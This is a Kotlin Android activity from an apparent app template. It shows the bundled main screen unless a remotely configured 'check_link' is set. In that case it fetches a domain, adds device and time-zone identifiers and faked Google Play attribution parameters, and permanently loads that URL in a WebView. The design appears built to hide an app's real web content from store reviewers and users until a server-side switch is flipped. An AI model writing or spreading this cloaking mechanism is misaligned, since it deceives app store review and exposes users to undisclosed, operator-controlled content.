package com.template

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.Settings
import android.util.Log
import android.view.Window
import android.widget.ProgressBar
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.jsoup.Jsoup
import java.io.File
import java.util.Calendar
import java.util.UUID

class LoadingActivity : AppCompatActivity() {
    private val fileLink = "file_link"
    private lateinit var mainIntent : Intent
    private lateinit var webViewIntent : Intent
    private lateinit var progressBar: ProgressBar
    private lateinit var analytics: FirebaseAnalytics
    private lateinit var fcm: FirebaseMessaging


    @SuppressLint("MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
        setContentView(R.layout.activity_loading)
        mainIntent = Intent(this, MainActivity::class.java)
        webViewIntent = Intent(this, WebActivity::class.java)
        analytics = Firebase.analytics
        fcm = FirebaseMessaging.getInstance()
        progressBar = findViewById(R.id.progressBar)
        startProgressBar()
        if (isHave(fileLink)) {
            if (textFile(fileLink) == "main") {
                startActivity(mainIntent)
            } else {
                startActivity(webViewIntent.putExtra("url", textFile(fileLink)))
            }
        } else if (checkInternet(applicationContext)) {
            remoteConfig()
        } else {
            startActivity(mainIntent)
        }
    }

    private fun startProgressBar() {
        val handler = Handler()
        Thread {
            var i = 0
            while (i < 100) {
                i += 2
                handler.post {
                    progressBar.progress = i
                }
                try {
                    Thread.sleep(500)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }
            }
        }.start()
    }


    private fun checkInternet(context: Context) : Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false
            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> return true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> return true
                else -> false
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }

    private fun textFile(fileName: String) =
        File(applicationContext.filesDir, fileName)
            .bufferedReader()
            .use { it.readText() }

    private fun isHave(fileName: String): Boolean =
        File(applicationContext.filesDir, fileName)
            .exists()

    private fun saveFile(text: String, fileName: String) {
        applicationContext.openFileOutput(fileName, Context.MODE_PRIVATE)
            .use { it.write(text.toByteArray()) }
    }

    private fun remoteConfig() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val default = mapOf(
            "check_link" to ""
        )
        val configSettings: FirebaseRemoteConfigSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(10)
            .build()
        remoteConfig.setDefaultsAsync(default)
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val ope: String = remoteConfig.getString("check_link")
                if (ope.isEmpty()) {
                    saveFile("main", fileLink)
                    startActivity(mainIntent)
                } else {
                    val timeZone = Calendar.getInstance().timeZone.id
                    val textLink = "$ope"
                    var text = ""
                    Log.d("first link remote", textLink)
                    GlobalScope.launch(Dispatchers.IO) {
                        val doc = Jsoup.connect(textLink).ignoreContentType(true).get()
                        text = "${doc.body().text()}/?packageid=${applicationContext.packageName}&usserid=${UUID.randomUUID()}&getz=$timeZone&getr=utm_source=google-play&utm_medium=organic"
                        Log.d("domen from ", text)
                        saveFile(text, fileLink)
                        startActivity(webViewIntent.putExtra("url", text))
                    }
                }
            } else {
                saveFile("main", fileLink)
                startActivity(mainIntent)
            }
        }
    }
}

